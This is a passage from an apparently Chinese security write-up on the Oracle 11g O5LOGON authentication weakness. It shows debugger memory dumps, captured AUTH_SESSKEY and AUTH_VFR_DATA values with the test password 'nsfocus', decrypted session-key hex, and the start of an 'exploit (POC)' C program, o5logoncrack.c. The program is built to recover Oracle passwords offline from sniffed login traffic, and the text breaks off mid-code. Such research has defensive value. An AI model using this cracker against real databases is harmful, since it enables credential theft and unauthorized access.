<br>0DC3A574  8D 1D B3 B7 60 30 C7 56 00 00 00 00 8C A5 C3 0D..                        <br>0DC3A584  C8 B3 13 21 77 BF F6 84 28 3A D6 54 9F 65 96 0B..                        <br>0DC3A594  0E 0A E4 60 00 00 00 00 00 00 00 00 00 00 00 00..                        <br>0DC3A5A4  18 00 00 00 84 A5 C3 0D E0 3E FE 0C A8 46 A7 0C..                     <br>0DC3A5B4  94 77 FE 0C 0C C6 C3 0D 4A EA 50 01 F4 C4 C3 0D..                        <br>0DC3A5C4  F8 49 FE 0C 10 FB EC 0D..........................                     <br>                                                                                <br>                                                                                <br>eax = 0DC3A4F0                                                                  <br>edx = 0DC3A514                                                                  <br>ecx = 0DC3A554                                                                  <br>ebx = 0DC3A5A4                                                                  <br>                                                                                <br>                                                                                <br>0DC3A4E4                                      30 00 00 00..                     <br>0DC3A4F4  00 00 00 00 00 00 00 00 00 00 00 00 10 00 00 00..                        <br>0DC3A504  0C 4A FE 0C 02 00 00 00 FF FF FF FF 13 00 00 00..                        <br>0DC3A514  61 15 91 7F D6 AE B9 29 00 07 A4 02 A6 B1 2B AA..                        <br>0DC3A524  BD 3B AA 0C 13 C0 E5 18 8E FE BA AC F5 4C 01 BE.                      <br>0DC3A534  96 8F 59 0D B9 9E 2C F6 98 74 1F EF 22 CE 17 47..                        <br>0DC3A544  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00..                        <br>0DC3A554  7A EF 5B 9E 89 D3 9F 07 62 A8 83 BB C6 4D 9F D9..                        <br>0DC3A564  EA 7B 90 1C 49 9B 73 36 BE 60 AF F6 69 A4 ED 37..                        <br>0DC3A574  8D 1D B3 B7 60 30 C7 56 00 00 00 00 8C A5 C3 0D..                        <br>0DC3A584  C8 B3 13 21 77 BF F6 84 28 3A D6 54 9F 65 96 0B..                        <br>0DC3A594  0E 0A E4 60 00 00 00 00 00 00 00 00 00 00 00 00..                        <br>0DC3A5A4  18 00 00 00 84 A5 C3 0D E0 3E FE 0C A8 46 A7 0C..                     <br>0DC3A5B4  94 77 FE 0C 0C C6 C3 0D 4A EA 50 01 F4 C4 C3 0D..                        <br>0DC3A5C4  F8 49 FE 0C 10 FB EC 0D<br><br><br>0DC3A4F0   30 00 00 00       offset<br>0DC3A514   61 15 91 7F  ...  encrypted session key (0x30 byte)<br>0DC3A554   7A EF 5B 9E  ...  plaintext session key (0x28 byte)<br>0DC3A584   8 B3 13 21   ...  password  hash        (0x18 byte)<br></code></pre></td></tr></table></figure>

<p>AES 192 加密40字节的明文，需要填充 8个 0x08</p>
<p>11.1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">PASSWORD:            nsfocus<br>AUTH_SESSKEY:        43FD38029377C84620AE1851FC1D231409985064DEA0D0B8D48E50E6051751A5D8FDFEAAA9F83B99F37B051FA67F8546<br>AUTH_SESSKEY_CLIENT: C7248F0873F04B5A02E59178804BD361B0C77B20A4CF685460DA472996D5245745A791DFEA14399831EC62380808903C<br>AUTH_PASSWORD:       8B4C7D85F421EBA059FDBA21F5708FD4D3BB8AB2168941243B5EF07681F3B80A<br>AUTH_VFR_DATA:       3DA8A309D636ACF87004<br><br>PASSWORD HASH:       EF92924A1DB06441457FDABC24BF89055C8594F7<br></code></pre></td></tr></table></figure>

<p>11.2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">PASSWORD    :        nsfocus<br>AUTH_SESSKEY:        52FC04B1FF8110CA1263DF5BC61A7E57740C8A5111D22B41E53CC167FDF2A6878958200D9B2B6A51C95D779FDEBABB69<br>AUTH_SESSKEY_C       FA6DCD0F389E92D18F8188EC69313B524F421184FAE679613A72FC8DFD0A4C7BB93A6ACB8E05B8258A020D2954EC1B63<br>AUTH_PASSWORD        2C5F957A6532AD91D916F4E5FA7D2FDA0E6CDFFBAAED883CAF4F200C8983AE3D<br>AUTH_VFR_DATA        43E0BE20B32B0BB76E57<br><br>PASSWORD HASH:       C3D98762D258D4BD92C572065DDEA9AF38123F88 43E0BE20B32B0BB76E57<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">aes key<br>0000 ef 92 92 4a 1d b0 64 41 45 7f da bc 24 bf 89 05<br>0010 5c 85 94 f7 00 00 00 00<br><br>decrypted_server_sesskey<br>0000 47 43 56 45 1f 61 c7 89 68 83 be ad ed c0 f4 54<br>0010 e3 dd 61 88 7e 78 d8 9a bc 8f dc 15 4f a6 2f 26<br>0020 a0 35 e2 63 68 bb 02 1b 08 08 08 08 08 08 08 08<br><br>encrypted_server_sesskey<br>0000 43 fd 38 02 93 77 c8 46 20 ae 18 51 fc 1d 23 14<br>0010 09 98 50 64 de a0 d0 b8 d4 8e 50 e6 05 17 51 a5<br>0020 d8 fd fe aa a9 f8 3b 99 f3 7b 05 1f a6 7f 85 46<br><br>AUTH_SESSKEY<br>0000 43 fd 38 02 93 77 c8 46 20 ae 18 51 fc 1d 23 14<br>0010 09 98 50 64 de a0 d0 b8 d4 8e 50 e6 05 17 51 a5<br>0020 d8 fd fe aa a9 f8 3b 99 f3 7b 05 1f a6 7f 85 46<br></code></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">aes key<br>0000 c3 d9 87 62 d2 58 d4 bd 92 c5 72 06 5d de a9 af<br>0010 38 12 3f 88 00 00 00 00<br><br>decrypted_server_sesskey<br>0000 21 64 7f ef 76 d3 ee 80 ed 24 47 50 f8 f4 f0 a6<br>0010 e4 18 a3 2a 40 0b 96 ea 5b 70 26 ab 6a e4 62 f5<br>0020 81 e0 62 1c 13 a0 21 90 08 08 08 08 08 08 08 08<br><br>encrypted_server_sesskey<br>0000 52 fc 04 b1 ff 81 10 ca 12 63 df 5b c6 1a 7e 57<br>0010 74 0c 8a 51 11 d2 2b 41 e5 3c c1 67 fd f2 a6 87<br>0020 89 58 20 0d 9b 2b 6a 51 c9 5d 77 9f de ba bb 69<br><br>AUTH_SESSKEY<br>0000 52 fc 04 b1 ff 81 10 ca 12 63 df 5b c6 1a 7e 57<br>0010 74 0c 8a 51 11 d2 2b 41 e5 3c c1 67 fd f2 a6 87<br>0020 89 58 20 0d 9b 2b 6a 51 c9 5d 77 9f de ba bb 69<br></code></pre></td></tr></table></figure>


<h2 id="exploit-POC"><a href="#exploit-POC" class="headerlink" title="exploit (POC)"></a>exploit (POC)</h2><p>o5logoncrack.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment">11.1</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">PASSWORD:            nsfocus</span><br><span class="hljs-comment">AUTH_SESSKEY:        43FD38029377C84620AE1851FC1D231409985064DEA0D0B8D48E50E6051751A5D8FDFEAAA9F83B99F37B051FA67F8546</span><br><span class="hljs-comment">AUTH_SESSKEY_CLIENT: C7248F0873F04B5A02E59178804BD361B0C77B20A4CF685460DA472996D5245745A791DFEA14399831EC62380808903C</span><br><span class="hljs-comment">AUTH_PASSWORD:       8B4C7D85F421EBA059FDBA21F5708FD4D3BB8AB2168941243B5EF07681F3B80A</span><br><span class="hljs-comment">AUTH_VFR_DATA:       3DA8A309D636ACF87004</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">PASSWORD HASH:       EF92924A1DB06441457FDABC24BF89055C8594F7</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">11.2</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">PASSWORD    :           nsfocus</span><br><span class="hljs-comment">AUTH_SESSKEY:           52FC04B1FF8110CA1263DF5BC61A7E57740C8A5111D22B41E53CC167FDF2A6878958200D9B2B6A51C95D779FDEBABB69</span><br><span class="hljs-comment">AUTH_SESSKEY_C          FA6DCD0F389E92D18F8188EC69313B524F421184FAE679613A72FC8DFD0A4C7BB93A6ACB8E05B8258A020D2954EC1B63</span><br><span class="hljs-comment">AUTH_PASSWORD           2C5F957A6532AD91D916F4E5FA7D2FDA0E6CDFFBAAED883CAF4F200C8983AE3D</span><br><span class="hljs-comment">AUTH_VFR_DATA           43E0BE20B32B0BB76E57</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">PASSWORD HASH:          C3D98762D258D4BD92C572065DDEA9AF38123F88 43E0BE20B32B0BB76E57</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">11.x</span><br><span class="hljs-comment">ED91B97A04000F326F17430A65DACB30CD1EF788E6EC310742B811E32112C0C9CC39554C9C01A090CB95E95C94140C28</span><br><span class="hljs-comment">40E7B86C99F4BF1D0F17538C22EBCE054F5F677E2B521480F1F56143D047C00469A87049DE1B9CADDC8EA71392AD6E3A</span><br><span class="hljs-comment">2D4FD970C12D9618742E4525C514105E0BE24DE75C04A0C4BF6DD46BE88A339E</span><br><span class="hljs-comment">7FD52BC80AA5836695D4</span><br><span class="hljs-comment">18C314BE125DF23689215C78C33F623AABF1152E</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">-------------------------------------</span><br><span class="hljs-comment">aes key</span><br><span class="hljs-comment">0000 ef 92 92 4a 1d b0 64 41 45 7f da bc 24 bf 89 05</span><br><span class="hljs-comment">0010 5c 85 94 f7 00 00 00 00</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">decrypted_server_sesskey</span><br><span class="hljs-comment">0000 47 43 56 45 1f 61 c7 89 68 83 be ad ed c0 f4 54</span><br><span class="hljs-comment">0010 e3 dd 61 88 7e 78 d8 9a bc 8f dc 15 4f a6 2f 26</span><br><span class="hljs-comment">0020 a0 35 e2 63 68 bb 02 1b 08 08 08 08 08 08 08 08</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">encrypted_server_sesskey</span><br><span class="hljs-comment">0000 43 fd 38 02 93 77 c8 46 20 ae 18 51 fc 1d 23 14</span><br><span class="hljs-comment">0010 09 98 50 64 de a0 d0 b8 d4 8e 50 e6 05 17 51 a5</span><br><span class="hljs-comment">0020 d8 fd fe aa a9 f8 3b 99 f3 7b 05 1f a6 7f 85 46</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">AUTH_SESSKEY</span><br><span class="hljs-comment">0000 43 fd 38 02 93 77 c8 46 20 ae 18 51 fc 1d 23 14</span><br><span class="hljs-comment">0010 09 98 50 64 de a0 d0 b8 d4 8e 50 e6 05 17 51 a5</span><br><span class="hljs-comment">0020 d8 fd fe aa a9 f8 3b 99 f3 7b 05 1f a6 7f 85 46</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">----------------</span><br><span class="hljs-comment">aes key</span><br><span class="hljs-comment">0000 c3 d9 87 62 d2 58 d4 bd 92 c5 72 06 5d de a9 af</span><br><span class="hljs-comment">0010 38 12 3f 88 00 00 00 00</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">decrypted_server_sesskey</span><br><span class="hljs-comment">0000 21 64 7f ef 76 d3 ee 80 ed 24 47 50 f8 f4 f0 a6</span><br><span class="hljs-comment">0010 e4 18 a3 2a 40 0b 96 ea 5b 70 26 ab 6a e4 62 f5</span><br><span class="hljs-comment">0020 81 e0 62 1c 13 a0 21 90 08 08 08 08 08 08 08 08</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">encrypted_server_sesskey</span><br><span class="hljs-comment">0000 52 fc 04 b1 ff 81 10 ca 12 63 df 5b c6 1a 7e 57</span><br><span class="hljs-comment">0010 74 0c 8a 51 11 d2 2b 41 e5 3c c1 67 fd f2 a6 87</span><br><span class="hljs-comment">0020 89 58 20 0d 9b 2b 6a 51 c9 5d 77 9f de ba bb 69</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">AUTH_SESSKEY</span><br><span class="hljs-comment">0000 52 fc 04 b1 ff 81 10 ca 12 63 df 5b c6 1a 7e 57</span><br><span class="hljs-comment">0010 74 0c 8a 51 11 d2 2b 41 e5 3c c1 67 fd f2 a6 87</span><br><span class="hljs-comment">0020 89 58 20 0d 9b 2b 6a 51 c9 5d 77 9f de ba bb 69</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">------------------</span><br><span class="hljs-comment">aes key</span><br><span class="hljs-comment">0000 18 c3 14 be 12 5d f2 36 89 21 5c 78 c3 3f 62 3a</span><br><span class="hljs-comment">0010 ab f1 15 2e 00 00 00 00</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">decrypted_server_sesskey</span><br><span class="hljs-comment">0000 07 eb ab db ee 3a 0e b0 ab e1 9f 68 12 c1 e3 e6</span><br><span class="hljs-comment">0010 5a e9 fd 7c b9 ca ae e2 fb 21 20 d4 af 83 de 0c</span><br><span class="hljs-comment">0020 1e 12 dc 01 22 05 a0 75 08 08 08 08 08 08 08 08</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">encrypted_server_sesskey</span><br><span class="hljs-comment">0000 ed 91 b9 7a 04 00 0f 32 6f 17 43 0a 65 da cb 30</span><br><span class="hljs-comment">0010 cd 1e f7 88 e6 ec 31 07 42 b8 11 e3 21 12 c0 c9</span><br><span class="hljs-comment">0020 cc 39 55 4c 9c 01 a0 90 cb 95 e9 5c 94 14 0c 28</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">AUTH_SESSKEY</span><br><span class="hljs-comment">0000 ed 91 b9 7a 04 00 0f 32 6f 17 43 0a 65 da cb 30</span><br><span class="hljs-comment">0010 cd 1e f7 88 e6 ec 31 07 42 b8 11 e3 21 12 c0 c9</span><br><span class="hljs-comment">0020 cc 39 55 4c 9c 01 a0 90 cb 95 e9 5c 94 14 0c 28</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;openssl/aes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;openssl/md5.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;openssl/sha.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;getopt.h&quot;</span></span><br><br><br><span class="hljs-comment">//*********************************************************************************************************************</span><br><span class="hljs-comment">// Hashes captured on the network during authentication phase</span><br><br><span class="hljs-comment">//unsigned char AUTH_SESSKEY  [] = &#123;  0x43,0xFD,0x38,0x02,0x93,0x77,0xC8,0x46,0x20,0xAE,0x18,0x51,0xFC,0x1D,0x23,0x14,0x09,0x98,0x50,0x64,0xDE,0xA0,0xD0,0xB8,0xD4,0x8E,0x50,0xE6,0x05,0x17,0x51,0xA5,0xD8,0xFD,0xFE,0xAA,0xA9,0xF8,0x3B,0x99,0xF3,0x7B,0x05,0x1F,0xA6,0x7F,0x85,0x46&#125;;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//unsigned char AUTH_SESSKEY_C[] = &#123;  0xC7,0x24,0x8F,0x08,0x73,0xF0,0x4B,0x5A,0x02,0xE5,0x91,0x78,0x80,0x4B,0xD3,0x61,0xB0,0xC7,0x7B,0x20,0xA4,0xCF,0x68,0x54,0x60,0xDA,0x47,0x29,0x96,0xD5,0x24,0x57,0x45,0xA7,0x91,0xDF,0xEA,0x14,0x39,0x98,0x31,0xEC,0x62,0x38,0x08,0x08,0x90,0x3C&#125;;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//unsigned char AUTH_PASSWORD [] = &#123;  0x8B,0x4C,0x7D,0x85,0xF4,0x21,0xEB,0xA0,0x59,0xFD,0xBA,0x21,0xF5,0x70,0x8F,0xD4,0xD3,0xBB,0x8A,0xB2,0x16,0x89,0x41,0x24,0x3B,0x5E,0xF0,0x76,0x81,0xF3,0xB8,0x0A &#125;;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//unsigned char AUTH_VFR_DATA [] = &#123;  0x3D,0xA8,0xA3,0x09,0xD6,0x36,0xAC,0xF8,0x70,0x04 &#125;;</span><br><br><span class="hljs-comment">//unsigned char AUTH_SESSKEY  [] = &#123; 0x52,0xFC,0x04,0xB1,0xFF,0x81,0x10,0xCA,0x12,0x63,0xDF,0x5B,0xC6,0x1A,0x7E,0x57,0x74,0x0C,0x8A,0x51,0x11,0xD2,0x2B,0x41,0xE5,0x3C,0xC1,0x67,0xFD,0xF2,0xA6,0x87,0x89,0x58,0x20,0x0D,0x9B,0x2B,0x6A,0x51,0xC9,0x5D,0x77,0x9F,0xDE,0xBA,0xBB,0x69 &#125;;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//unsigned char AUTH_SESSKEY_C[] = &#123; 0xFA,0x6D,0xCD,0x0F,0x38,0x9E,0x92,0xD1,0x8F,0x81,0x88,0xEC,0x69,0x31,0x3B,0x52,0x4F,0x42,0x11,0x84,0xFA,0xE6,0x79,0x61,0x3A,0x72,0xFC,0x8D,0xFD,0x0A,0x4C,0x7B,0xB9,0x3A,0x6A,0xCB,0x8E,0x05,0xB8,0x25,0x8A,0x02,0x0D,0x29,0x54,0xEC,0x1B,0x63 &#125;;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//unsigned char AUTH_PASSWORD [] = &#123; 0x2C,0x5F,0x95,0x7A,0x65,0x32,0xAD,0x91,0xD9,0x16,0xF4,0xE5,0xFA,0x7D,0x2F,0xDA,0x0E,0x6C,0xDF,0xFB,0xAA,0xED,0x88,0x3C,0xAF,0x4F,0x20,0x0C,0x89,0x83,0xAE,0x3D &#125;;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//unsigned char AUTH_VFR_DATA [] = &#123;  0x43,0xE0,0xBE,0x20,0xB3,0x2B,0x0B,0xB7,0x6E,0x57 &#125;;</span><br><span class="hljs-comment">//</span><br><br><br><span class="hljs-comment">//unsigned char AUTH_SESSKEY  [] = &#123; 0xED,0x91,0xB9,0x7A,0x04,0x00,0x0F,0x32,0x6F,0x17,0x43,0x0A,0x65,0xDA,0xCB,0x30,0xCD,0x1E,0xF7,0x88,0xE6,0xEC,0x31,0x07,0x42,0xB8,0x11,0xE3,0x21,0x12,0xC0,0xC9,0xCC,0x39,0x55,0x4C,0x9C,0x01,0xA0,0x90,0xCB,0x95,0xE9,0x5C,0x94,0x14,0x0C,0x28 &#125;; </span><br><br><span class="hljs-comment">//unsigned char AUTH_VFR_DATA [] = &#123; 0x7F,0xD5,0x2B,0xC8,0x0A,0xA5,0x83,0x66,0x95,0xD4 &#125;; </span><br><br><span class="hljs-comment">//unsigned char AUTH_SESSKEY  [] = &#123;   0xBD,0x53,0x44,0x89,0x91,0xEE,0xAB,0x1E,0xCD,0x8D,0x32,0xFB,0x59,0x52,0x3F,0x0C,0xBD,0xB3,0x3B,0x40,0xC2,0x8F,0xEB,0xED,0xDD,0x5A,0xA3,0xA4,0xAF,0x0C,0xF6,0xB7,0x23,0x06,0x16,0x2D,0x3F,0x0C,0x1E,0x8D,0xB2,0x53,0x8A,0xF2,0x91,0xEC,0x01,0xA5&#125;;</span><br><br><span class="hljs-comment">//unsigned char AUTH_VFR_DATA [] = &#123; 0x03,0x1C,0xB4,0x72,0xC4,0xD9,0x04,0x12,0xDD,0x31 &#125;; </span><br><br><span class="hljs-comment">//*********************************************************************************************************************</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">HexStringtoBinArray</span><span class="hljs-params">(<span class="hljs-type">char</span>* str, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* <span class="hljs-built_in">array</span>)</span>&#123;<br>    <span class="hljs-type">int</span> alen=<span class="hljs-built_in">strlen</span>(str)/<span class="hljs-number">2</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> t[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> hexc;<br>    <span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(;i&lt;<span class="hljs-built_in">strlen</span>(str);i=i+<span class="hljs-number">2</span>)&#123;<br>        t[<span class="hljs-number">0</span>]=str[i];<br>        t[<span class="hljs-number">1</span>]=str[i+<span class="hljs-number">1</span>];<br>        hexc = t[<span class="hljs-number">0</span>]<span class="hljs-number">-48</span>;<br>        <span class="hljs-keyword">if</span> (hexc &gt; <span class="hljs-number">9</span>) hexc-=<span class="hljs-number">7</span>;<br>        <span class="hljs-built_in">array</span>[j]=hexc*<span class="hljs-number">16</span>;<br>        hexc = t[<span class="hljs-number">1</span>]<span class="hljs-number">-48</span>;<br>        <span class="hljs-keyword">if</span> (hexc &gt; <span class="hljs-number">9</span>) hexc-=<span class="hljs-number">7</span>;<br>        <span class="hljs-built_in">array</span>[j]+=hexc;<br>        j++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> j;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">hexdump</span><span class="hljs-params">( FILE *f, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *title, <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *s,<span class="hljs-type">int</span> l)</span> &#123;<br>    <span class="hljs-type">int</span> n = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">fprintf</span>(f, <span class="hljs-string">&quot;%s&quot;</span>, title);<br>    <span class="hljs-keyword">for</span> (; n &lt; l; ++n) &#123;<br>        <span class="hljs-keyword">if</span> ((n % <span class="hljs-number">16</span>) == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">fprintf</span>(f, <span class="hljs-string">&quot;\n%04x&quot;</span>, n);<br>        &#125;<br>        <span class="hljs-built_in">fprintf</span>(f, <span class="hljs-string">&quot; %02x&quot;</span>, s[n]);<br>    &#125;<br><br>    <span class="hljs-built_in">fprintf</span>(f, <span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title 